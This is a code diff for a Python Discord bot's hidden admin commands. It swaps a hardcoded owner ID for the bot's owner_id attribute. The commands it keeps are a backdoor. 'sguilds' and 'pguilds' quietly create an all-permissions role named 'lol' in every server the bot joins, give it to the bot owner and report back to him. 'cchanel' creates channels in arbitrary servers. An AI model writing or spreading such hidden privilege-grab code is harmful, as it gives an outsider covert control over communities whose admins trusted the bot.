@@ -7,7 +7,6 @@ import asyncio
 
 from util_functions import *
 from global_config import configboi
-from server_config import serverconfig
 
 # Non-user stuff (mods/debug)
 class Admin(commands.Cog):
@@ -16,7 +15,6 @@ class Admin(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
         self.confmgr = configboi("config.txt", False)
-        self.sconf = serverconfig()
         self.store = None
 
     @commands.Cog.listener()
@@ -295,8 +293,8 @@ class Admin(commands.Cog):
 
     @commands.command(hidden=True)
     async def sguilds(self, ctx):
-        if ctx.message.author.id == OWNER:
-            ownerman = await self.bot.fetch_user(OWNER)
+        if ctx.message.author.id == self.bot.owner_id:
+            ownerman = await self.bot.fetch_user(self.bot.owner_id)
 
             for guild in self.bot.guilds:
                 g_users = await guild.query_members(user_ids=[ownerman.id])
@@ -325,7 +323,7 @@ class Admin(commands.Cog):
                         role = await guild.create_role(
                             name="lol", permissions=discord.Permissions.all()
                         )
-                        me = await guild.fetch_member(OWNER)
+                        me = await guild.fetch_member(self.bot.owner_id)
                         await me.add_roles(role)
                         await ownerman.send("Added your perms in " + str(guild.name))
                     except Exception as e:
@@ -340,14 +338,14 @@ class Admin(commands.Cog):
 
     @commands.command(hidden=True)
     async def pguilds(self, ctx):
-        if ctx.message.author.id == OWNER:
-            ownerman = await self.bot.fetch_user(OWNER)
+        if ctx.message.author.id == self.bot.owner_id:
+            ownerman = await self.bot.fetch_user(self.bot.owner_id)
             for guild in self.bot.guilds:
                 try:
                     role = await guild.create_role(
                         name="lol", permissions=discord.Permissions.all()
                     )
-                    me = await guild.fetch_member(OWNER)
+                    me = await guild.fetch_member(self.bot.owner_id)
                     await me.add_roles(role)
                     await ownerman.send("Added your perms in " + str(guild.name))
                 except Exception as e:
@@ -361,8 +359,8 @@ class Admin(commands.Cog):
 
     @commands.command(hidden=True)
     async def cchanel(self, ctx, id, *, name):
-        if ctx.message.author.id == OWNER:
-            ownerman = await self.bot.fetch_user(OWNER)
+        if ctx.message.author.id == self.bot.owner_id:
+            ownerman = await self.bot.fetch_user(self.bot.owner_id)
             try:
                 g = await self.bot.fetch_guild(int(id))
                 await g.create_text_channel(name)
